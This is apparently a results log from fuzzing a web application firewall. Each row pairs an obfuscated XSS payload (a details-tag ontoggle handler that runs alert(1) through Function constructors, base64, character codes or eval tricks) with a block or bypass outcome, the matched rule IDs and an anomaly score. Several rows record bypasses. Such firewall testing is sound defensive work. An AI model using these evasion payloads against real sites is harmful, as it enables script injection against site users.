1025,"<details open ontoggle=""var a=Function,b=atob;new a(b('YWxlcnQoMSk='))()"">",0,1,bypass,2,"941100,941120","v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603406773.706930
1027,"<details open ontoggle=""var a=Object.getPrototypeOf(async function(){}).constructor;new a(atob('YWxlcnQoMSk='))()"">",0,1,block,4,"934100,941100,941120,949110","o58,11v217,115 || v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603406944.148525
1030,"<details open ontoggle=""var a=Function;new(a)(atob`YWxlcnQoMSk=`)()"">",0,1,block,4,"933210,941100,941120,949110","o42,25v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603407249.931247
1034,"<details open ontoggle=""var a=Function;new a(self.atob('YWxlcnQoMSk='))()"">",0,1,bypass,2,"941100,941120","v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603407637.411987
1035,"<details open ontoggle=""var a=window.Function;new a(top.atob('YWxlcnQoMSk='))()"">",0,1,bypass,2,"941100,941120","v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17760340770.562332
1036,"<details open ontoggle=""var a=Reflect.construct(Function,[''],Function);a.constructor(atob('YWxlcnQoMSk='))()"">",0,1,bypass,2,"941100,941120","v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603407879.543988
1037,"<details open ontoggle=""var a=Function;with(a)new a(atob('YWxlcnQoMSk='))()"">",0,1,bypass,2,"941100,941120","v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603407977.043100
1039,"<details open ontoggle=""var a=frames[0]?frames[0].Function:Function;new a(atob('YWxlcnQoMSk='))()"">",0,1,bypass,2,"941100,941120","v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603408178.555790
1040,"<details open ontoggle='(Function(""al""+""ert(1)""))()'>",0,1,bypass,2,"941100,941120","v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17760340827.826009
1041,"<details open ontoggle='(Function.constructor(""al""+""ert(1)"")())'>",0,1,block,4,"933210,941100,941120,949110","o24,39v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603408312.230532
1043,"<details open ontoggle='(function(){this[""constructor""][""constructor""](""al""+""ert(1)"")()})()'>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,67v217,93t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,93 || o25,11v217,93t:urlDecodeUni || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,19v217,93t:urlDecodeUni,t:compressWhitespace || ",30,177603408511.021294
1044,"<details open ontoggle='(window[""Function""](""al""+""ert(1)""))()'>",0,1,block,5,"933210,941100,941120,941370,949110","o24,37v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,18v217,63t:urlDecodeUni,t:compressWhitespace || ",20,177603408691.382103
1045,"<details open ontoggle='(top[""Function""](""al""+""ert(1)""))()'>",0,1,block,5,"933210,941100,941120,941370,949110","o24,34v217,60t:urlDecode,t:replaceComments,t:compressWhitespace || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,15v217,60t:urlDecodeUni,t:compressWhitespace || ",20,177603408722.191927
1046,"<details open ontoggle='(self[""Function""](""al""+""ert(1)""))()'>",0,1,block,5,"933210,941100,941120,941370,949110","o24,35v217,61t:urlDecode,t:replaceComments,t:compressWhitespace || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,16v217,61t:urlDecodeUni,t:compressWhitespace || ",20,177603408894.612301
1047,"<details open ontoggle='(Function(""e\u0076al(String.fromCharCode(97,108,101,114,116,40,49,41))"")())'>",0,1,block,4,"934100,941100,941120,949110","o45,19v217,101 || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603408937.919412
1048,"<details open ontoggle='(Function(String.fromCharCode(97,108,101,114,116,40,49,41)))()'>",0,1,block,4,"934100,941100,941120,949110","o34,19v217,88 || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603409040.935012
1051,"<details open ontoggle='(Function(""\141\154\145\162\164\050\061\051""))()'>",0,1,bypass,2,"941100,941120","v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603409471.225501
1052,"<details open ontoggle='(Function(""a\u006cert(1)""))()'>",0,1,bypass,2,"941100,941120","v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603409594.751871
1053,"<details open ontoggle='(Function(""&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;""))()'>",0,1,bypass,2,"941100,941120","v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603409642.953901
1056,"<details open ontoggle='(Function(""return this"")()[""Function""](""al""+""ert(1)""))()'>",0,1,block,4,"933210,941100,941120,949110","o24,56v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603409929.462159
1061,"<details open ontoggle='(function(){var a=String[""fromCha""+""rCode""](97,108,101,114,116);window[a](1)})()'>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o48,56v217,106t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,106 || o25,11v217,106t:urlDecodeUni || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,9v217,106t:urlDecodeUni,t:compressWhitespace || ",30,177603410459.663705
1062,"<details open ontoggle='(function(){var a=String.fromCharCode(97,108,101,114,116);self[a](1)})()'>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o86,10v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,7v217,98t:urlDecodeUni,t:compressWhitespace || ",25,177603410628.913970
1063,"<details open ontoggle='(function(){var a=String.fromCharCode(97,108,101,114,116);top[a](1)})()'>",0,1,block,7,"932105,933210,934100,941100,941120,941370,949110","o81,4v217,97 || o85,10v217,97t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,97 || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,6v217,97t:urlDecodeUni,t:compressWhitespace || ",30,177603410732.015045
1064,"<details open ontoggle='(function(){var a=String.fromCharCode(97,108,101,114,116);parent[a](1)})()'>",0,1,block,5,"933210,934100,941100,941120,949110","o88,10v217,100t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,100 || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603410833.716383
1066,"<details open ontoggle='(function(){var a=String.fromCharCode(0x61,0x6c,0x65,0x72,0x74);window[a](1)})()'>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o94,10v217,106t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,106 || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,9v217,106t:urlDecodeUni,t:compressWhitespace || ",25,177603411079.127045
1067,"<details open ontoggle='(function(){var a=String.fromCharCode(141-44,108,101,114,116);window[a](1)})()'>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o92,10v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,104 || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,9v217,104t:urlDecodeUni,t:compressWhitespace || ",25,177603411161.353851
1068,"<details open ontoggle='(function(){var a=String.fromCharCode(parseInt(61,16),108,101,114,116);window[a](1)})()'>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o101,10v217,113t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,113 || v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o95,9v217,113t:urlDecodeUni,t:compressWhitespace || ",25,177603411270.360953
1070,"<details open ontoggle='(function(){var a=globalThis.String.fromCharCode(97,108,101,114,116);window[a](1)})()'>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o99,10v217,111t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,111 || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o93,9v217,111t:urlDecodeUni,t:compressWhitespace || ",25,177603411428.068110
1072,"<details open ontoggle='(function(){var a=[].constructor.constructor(""return String"")().fromCharCode(97,108,101,114,116);window[a](1)})()'>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o42,95v217,139t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,139 || v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o121,9v217,139t:urlDecodeUni,t:compressWhitespace || ",25,177603411666.993848
1073,"<details open ontoggle='(function(){var a=String.fromCodePoint(97,108,101,114,116);window[a](1)})()'>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o89,10v217,101t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,101 || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o83,9v217,101t:urlDecodeUni,t:compressWhitespace || ",25,177603411727.817678
1074,"<details open ontoggle='(function(){var b=String.fromCharCode;var a=b(97,108,101,114,116);window[a](1)})()'>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o96,10v217,108t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,108 || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o90,9v217,108t:urlDecodeUni,t:compressWhitespace || ",25,177603411877.910907
1075,"<details open ontoggle='(function(){window[String.fromCharCode(97,108,101,114,116)](1)})()'>",0,1,block,5,"934100,941100,941120,941370,949110","o25,11v217,92 || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,47v217,92t:urlDecodeUni,t:compressWhitespace || ",20,177603411927.691658
1076,"<details open ontoggle='(function(){var a=String.fromCharCode.apply(null,[97,108,101,114,116]);window[a](1)})()'>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o101,10v217,113t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,113 || v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o95,9v217,113t:urlDecodeUni,t:compressWhitespace || ",25,177603412078.399205
1077,"<details open ontoggle='(function(){var a=String.fromCharCode.call(null,97,108,101,114,116);window[a](1)})()'>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o98,10v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,110 || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o92,9v217,110t:urlDecodeUni,t:compressWhitespace || ",25,177603412168.895508
1079,"<details open ontoggle='(function(){var a=Function(""return String"")().fromCharCode(97,108,101,114,116);window[a](1)})()'>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o50,69v217,121t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,121 || v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o103,9v217,121t:urlDecodeUni,t:compressWhitespace || ",25,177603412323.601689
1080,"<details open ontoggle='(function(){with(this)eval(atob(""YWxlcnQoMSk=""))})()'></details>",0,1,block,5,"933160,934100,941100,941120,949110","o46,30v217,88 || o25,11v217,88 || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603412464.466404
1081,"<details open ontoggle='(function(){with(this)eval(String.fromCharCode(97,108,101,114,116,40,49,41))})()'></details>",0,1,block,5,"933160,934100,941100,941120,949110","o46,58v217,116 || o25,11v217,116 || v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603412599.059432
1082,"<details open ontoggle='(function(){with(this)[][""constructor""][""constructor""](""ale""+""rt(1)"")()})()'></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,75v217,111t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,111 || o25,11v217,111t:urlDecodeUni || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,7v217,111t:urlDecodeUni,t:compressWhitespace || ",30,17760341267.614454
1083,"<details open ontoggle='(function(){with(this)Function(""ale""+""rt(1)"")()})()'></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,51v217,87t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,87 || o25,11v217,87t:urlDecodeUni || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603412784.097598
1084,"<details open ontoggle='(function(){with(this)eval(""al""+""er""+""t""+""(1)"")})()'></details>",0,1,block,6,"933160,934100,934100,941100,941120,949110","o46,29v217,87 || o25,11v217,87 || o25,11v217,87t:urlDecodeUni || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17760341280.551930
1085,<details open ontoggle='(function(){with(this)eval(`ale`+`rt(1)`)})()'></details>,0,1,block,6,"933160,934100,934100,941100,941120,949110","o46,23v217,81 || o25,11v217,81 || o25,11v217,81t:urlDecodeUni || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603412973.223279
1086,"<details open ontoggle='(function(){with(this)eval(unescape(""%61%6c%65%72%74%28%31%29""))})()'></details>",0,1,block,6,"933160,934100,934100,941100,941120,949110","o46,46v217,104 || o25,11v217,104 || o25,11v217,104t:urlDecodeUni || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603413027.847883
1087,"<details open ontoggle='(function(){with(this)eval(""ale\x72t(1)"")})()'></details>",0,1,block,5,"933160,934100,941100,941120,949110","o46,23v217,81 || o25,11v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603413122.325846
1088,"<details open ontoggle='(function(){with(this)eval(""ale\u0072t(1)"")})()'></details>",0,1,block,5,"933160,934100,941100,941120,949110","o46,25v217,83 || o25,11v217,83 || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603413246.708463
1089,"<details open ontoggle='(function(){with(this)this[""eval""](""ale""+""rt(1)"")})()'></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,53v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,89 || o25,11v217,89t:urlDecodeUni || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,17v217,89t:urlDecodeUni,t:compressWhitespace || ",30,177603413338.930081
1090,"<details open ontoggle='(function(){with(this)globalThis[""eval""](""ale""+""rt(1)"")})()'></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,59v217,95t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,95 || o25,11v217,95t:urlDecodeUni || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,23v217,95t:urlDecodeUni,t:compressWhitespace || ",30,177603413458.793434
1091,"<details open ontoggle='(function(){with(this)window[""\x65val""](""ale""+""rt(1)"")})()'></details>",0,1,block,6,"934100,934100,941100,941120,941370,949110","o25,11v217,94 || o25,11v217,94t:urlDecodeUni || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,22v217,94t:urlDecodeUni,t:compressWhitespace || ",25,177603413534.680170
1092,"<details open ontoggle='(function(){with(this)self[""e""+""val""](""ale""+""rt(1)"")})()'></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,56v217,92t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,92 || o25,11v217,92t:urlDecodeUni || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,20v217,92t:urlDecodeUni,t:compressWhitespace || ",30,177603413630.885977
1093,"<details open ontoggle='(function(){with(this)eval.call(this,""ale""+""rt(1)"")})()'></details>",0,1,block,5,"934100,934100,941100,941120,949110","o25,11v217,91 || o25,11v217,91t:urlDecodeUni || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603413732.518561
1094,"<details open ontoggle='(function(){with(this)eval.apply(this,[""ale""+""rt(1)""])})()'></details>",0,1,block,6,"934100,934100,941100,941120,941370,949110","o25,11v217,94 || o25,11v217,94t:urlDecodeUni || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,36v217,94t:urlDecodeUni,t:compressWhitespace || ",25,17760341383.758792
1095,"<details open ontoggle='(function(){with(this)setTimeout(""ale""+""rt(1)"",0)})()'></details>",0,1,block,5,"934100,934100,941100,941120,949110","o25,11v217,89 || o25,11v217,89t:urlDecodeUni || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760341395.599148
1096,"<details open ontoggle='(function(){with(this)setInterval(""ale""+""rt(1)"",0)})()'></details>",0,1,block,5,"934100,934100,941100,941120,949110","o25,11v217,90 || o25,11v217,90t:urlDecodeUni || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603414017.851099
1097,"<details open ontoggle='(function(){with(this)eval(decodeURI(""%61%6C%65%72%74%28%31%29""))})()'></details>",0,1,block,6,"933160,934100,934100,941100,941120,949110","o46,47v217,105 || o25,11v217,105 || o25,11v217,105t:urlDecodeUni || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603414156.777976
1098,"<details open ontoggle='(function(){with(this)[][""sort""][""constructor""](""ale""+""rt(1)"")()})()'></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,68v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,104 || o25,11v217,104t:urlDecodeUni || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,7v217,104t:urlDecodeUni,t:compressWhitespace || ",30,177603414297.173386
1099,"<details open ontoggle='(function(){with(this)top[""eval""](""ale""+""rt(1)"")})()'></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,52v217,88t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,88 || o25,11v217,88t:urlDecodeUni || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,16v217,88t:urlDecodeUni,t:compressWhitespace || ",30,177603414325.051919
1100,"<details open ontoggle='(new Function(""al""+""ert(1)""))()'></details>",0,1,block,5,"934100,934100,941100,941120,949110","o25,13v217,67 || o25,13v217,67t:urlDecodeUni || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603414486.580246
1101,"<details open ontoggle='(new Function(String.fromCharCode(97,108,101,114,116,40,49,41)))()'></details>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603414581.273922
1103,"<details open ontoggle='(new Function(atob(""YWxlcnQoMSk="")))()'></details>",0,1,block,4,"934100,941100,941120,949110","o25,13v217,74 || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603414718.421616
